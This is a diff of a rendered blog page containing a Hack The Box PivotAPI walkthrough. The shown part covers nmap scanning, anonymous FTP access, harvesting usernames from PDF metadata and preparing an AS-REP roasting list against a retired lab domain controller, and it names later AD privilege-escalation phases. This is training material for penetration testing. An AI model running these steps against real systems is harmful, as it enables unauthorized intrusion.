@@ -1,20 +1,25 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: PivotAPI Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Anonymous FTP metadata and AS-REP roasting open SMB, where reversing a helpdesk binary yields SQL access and a KeePass-backed SSH foothold before an AD password-reset chain exposes LAPS administrator credentials."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:02:11.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[17," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-pivotapi-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box PivotAPI machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official PivotAPI machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/pivotapi","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9","$La","$Lb"]]}],"$Lc"]}]]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$L11",null,{"headings":[{"id":"phase-1-initial-reconnaissance-and-enumeration","label":"Phase 1: Initial Reconnaissance & Enumeration"},{"id":"phase-2-ftp-analysis-and-user-discovery","label":"Phase 2: FTP Analysis & User Discovery"},{"id":"phase-3-as-rep-roasting-the-first-crack","label":"Phase 3: AS-REP Roasting - The First Crack"},{"id":"phase-4-smb-enumeration-and-the-helpdesk-files","label":"Phase 4: SMB Enumeration & The HelpDesk Files"},{"id":"phase-5-binary-reversing-and-the-oracle-mssql-pivot","label":"Phase 5: Binary reversing and the Oracle/MSSQL pivot"},{"id":"phase-6-mssql-foothold-and-the-seimpersonate-dead-end","label":"Phase 6: MSSQL Foothold & The SeImpersonate Dead End"},{"id":"phase-7-the-unintended-shortcut-keepass-extraction","label":"Phase 7: The Unintended Shortcut - KeePass Extraction"},{"id":"phase-8-cracking-the-vault-keepass-to-ssh","label":"Phase 8: Cracking the Vault - KeePass to SSH"},{"id":"phase-9-user-flag-capture","label":"Phase 9: User Flag Capture"},{"id":"phase-10-active-directory-privilege-escalation-chain","label":"Phase 10: Active Directory Privilege Escalation Chain"},{"id":"phase-11-laps-the-final-key","label":"Phase 11: LAPS - The Final Key"},{"id":"phase-12-root-flag-capture","label":"Phase 12: Root Flag Capture"},{"id":"key-lessons","label":"Key lessons"},{"id":"full-command-reference","label":"Full Command Reference"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/2b42f3e85f9438be22d5df95da895e961088e35e/HTB-PivotAPI.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit 2b42f3e85f94",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["PivotAPI, Windows, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/pivotapi","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-a:["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}]
-b:["$","div","technical-clarification-3",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: Base64 is transport encoding, not a security control. The documented LAPS behavior is a property of this retired lab and should not be generalized to production domain controllers."}],null]}]
-12:T93b2,<p><strong>Machine:</strong> PivotAPI<br><strong>OS:</strong> Windows (Active Directory Domain Controller)<br><strong>Difficulty:</strong> Insane<br><strong>Target IP:</strong> <code>10.129.228.115</code><br><strong>Attacker IP:</strong> <code>10.10.14.6</code><br><strong>Domain:</strong> <code>LicorDeBellota.htb</code>  </p>
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: PivotAPI Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Anonymous FTP metadata and AS-REP roasting open SMB, where reversing a helpdesk binary yields SQL access and a KeePass-backed SSH foothold before an AD password-reset chain exposes LAPS administrator credentials."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"PivotAPI"}],"$L5","$L6"]}],"$L7","$L8"],null,null]}]]}],"$L9"]}],"$La","$Lb"]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","small",null,{"children":"Hack The Box machine record"}]
+6:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/pivotapi","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+7:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Windows"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Insane"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+8:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+9:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-pivotapi-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box PivotAPI machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official PivotAPI machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/pivotapi","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+a:["$","div",null,{"className":"article-rule"}]
+b:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L10",null,{"headings":[{"id":"phase-1-initial-reconnaissance-and-enumeration","label":"Phase 1: Initial Reconnaissance & Enumeration"},{"id":"phase-2-ftp-analysis-and-user-discovery","label":"Phase 2: FTP Analysis & User Discovery"},{"id":"phase-3-as-rep-roasting-the-first-crack","label":"Phase 3: AS-REP Roasting - The First Crack"},{"id":"phase-4-smb-enumeration-and-the-helpdesk-files","label":"Phase 4: SMB Enumeration & The HelpDesk Files"},{"id":"phase-5-binary-reversing-and-the-oracle-mssql-pivot","label":"Phase 5: Binary reversing and the Oracle/MSSQL pivot"},{"id":"phase-6-mssql-foothold-and-the-seimpersonate-dead-end","label":"Phase 6: MSSQL Foothold & The SeImpersonate Dead End"},{"id":"phase-7-the-unintended-shortcut-keepass-extraction","label":"Phase 7: The Unintended Shortcut - KeePass Extraction"},{"id":"phase-8-cracking-the-vault-keepass-to-ssh","label":"Phase 8: Cracking the Vault - KeePass to SSH"},{"id":"phase-9-user-flag-capture","label":"Phase 9: User Flag Capture"},{"id":"phase-10-active-directory-privilege-escalation-chain","label":"Phase 10: Active Directory Privilege Escalation Chain"},{"id":"phase-11-laps-the-final-key","label":"Phase 11: LAPS - The Final Key"},{"id":"phase-12-root-flag-capture","label":"Phase 12: Root Flag Capture"},{"id":"key-lessons","label":"Key lessons"},{"id":"full-command-reference","label":"Full Command Reference"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/2b42f3e85f9438be22d5df95da895e961088e35e/HTB-PivotAPI.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit 2b42f3e85f94",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["PivotAPI, Windows, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/pivotapi","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}],["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}],"$L11"]]}],"$L12"]}]
+c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-querier-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Querier Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:04:41.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-multimaster-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Multimaster Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:00:13.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T57b,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/#article","headline":"Hack The Box: PivotAPI Walkthrough","description":"Anonymous FTP metadata and AS-REP roasting open SMB, where reversing a helpdesk binary yields SQL access and a KeePass-backed SSH foothold before an AD password-reset chain exposes LAPS administrator credentials.","url":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/","datePublished":"2026-06-11T16:02:11.000Z","dateModified":"2026-06-11T16:02:11.000Z","wordCount":3309,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/2b42f3e85f9438be22d5df95da895e961088e35e/HTB-PivotAPI.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-pivotapi-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: PivotAPI Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-pivotapi-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+f:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+11:["$","div","technical-clarification-3",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: Base64 is transport encoding, not a security control. The documented LAPS behavior is a property of this retired lab and should not be generalized to production domain controllers."}],null]}]
+18:T9ddf,<p><strong>Machine:</strong> PivotAPI<br><strong>OS:</strong> Windows (Active Directory Domain Controller)<br><strong>Difficulty:</strong> Insane<br><strong>Target IP:</strong> <code>10.129.228.115</code><br><strong>Attacker IP:</strong> <code>10.10.14.6</code><br><strong>Domain:</strong> <code>LicorDeBellota.htb</code>  </p>
 <hr>
 
 
@@ -32,14 +37,14 @@ b:["$","div","technical-clarification-3",{"className":"article-review-note artic
 <li><strong>Port 5985 (WinRM)</strong> - Remote management (firewalled externally on this box)</li>
 </ul>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV --min-rate 5000 10.129.228.115
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV --min-rate 5000 10.129.228.115
 </code></pre>
 <p><strong>Why these ports?</strong> This is a "targeted script scan" rather than a full port scan. Once we see Kerberos (88) + LDAP (389) + SMB (445), we know this is an <strong>Active Directory Domain Controller</strong>. The presence of MSSQL (1433) and FTP (21) are unusual for a pure DC and immediately suggest custom services = attack surface.</p>
 
 <h3 id="step-1-2-adding-hosts-entries">Step 1.2: Adding Hosts Entries</h3>
 <p>The nmap scan reveals the domain name: <code>LicorDeBellota.htb</code> and hostname <code>PivotAPI.LicorDeBellota.htb</code>. Many Windows authentication protocols (Kerberos, LDAP, WinRM) require proper DNS resolution to function correctly.</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">echo "10.129.228.115 pivotapi.licordebellota.htb licordebellota.htb" | sudo tee -a /etc/hosts
+<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">echo "10.129.228.115 pivotapi.licordebellota.htb licordebellota.htb" | sudo tee -a /etc/hosts
 </code></pre>
 <p> Kerberos tickets are tied to domain names. If you try to AS-REP roast or authenticate without the domain in <code>/etc/hosts</code>, you'll get <code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code> errors that waste your time.</p>
 <hr>
@@ -47,7 +52,7 @@ b:["$","div","technical-clarification-3",{"className":"article-review-note artic
 <h3 id="step-2-1-anonymous-ftp-login">Step 2.1: Anonymous FTP Login</h3>
 <p>FTP allows anonymous login. This is a classic misconfiguration - admins sometimes use FTP as a lazy file drop without considering that anyone can read its contents.</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">ftp -pi 10.129.228.115
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">ftp -pi 10.129.228.115
 # Login: anonymous
 # Password: REDACTED
 </code></pre>
@@ -66,7 +71,7 @@ b:["$","div","technical-clarification-3",{"className":"article-review-note artic
 <h3 id="step-2-2-binary-mode-transfer">Step 2.2: Binary Mode Transfer</h3>
 <p>The <code>README.txt</code> says: <strong>"Don't forget to change the download mode to binary so that the files are not corrupted."</strong> This is a hint that someone before us corrupted files by downloading in ASCII mode.</p>
 <p><strong>Command inside FTP:</strong></p>
-<pre><code class="language-ftp" data-language="ftp">binary
+<pre tabindex="0" aria-label="ftp code or terminal block 4"><code class="language-ftp" data-language="ftp">binary
 prompt off
 mget *
 </code></pre>
@@ -80,10 +85,10 @@ mget *
 <li>Machine names</li>
 </ul>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">exiftool ftp/*.pdf | grep -iE "Creator|Author|Publisher"
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">exiftool ftp/*.pdf | grep -iE "Creator|Author|Publisher"
 </code></pre>
 <p><strong>Critical finding:</strong></p>
-<pre><code>Creator  : Kaorz
+<pre tabindex="0" aria-label="Code or terminal block 6"><code>Creator  : Kaorz
 Publisher: LicorDeBellota.htb
 </code></pre>
 <p>The PDF metadata reveals the username <code>Kaorz</code> and the domain <code>LicorDeBellota.htb</code>. The Publisher field ties the user to the target domain without brute force.</p>
@@ -91,10 +96,10 @@ Publisher: LicorDeBellota.htb
 <h3 id="step-2-4-building-a-user-list">Step 2.4: Building a User List</h3>
 <p>We collect all unique usernames from the metadata to maximize our AS-REP roasting chances.</p>
 <p><strong>Command:</strong></p>
-<pre><code class="language-bash" data-language="bash">exiftool ftp/*.pdf | grep -iE "Creator|Author" | awk '{print $3}' | sort -u &gt; users.txt
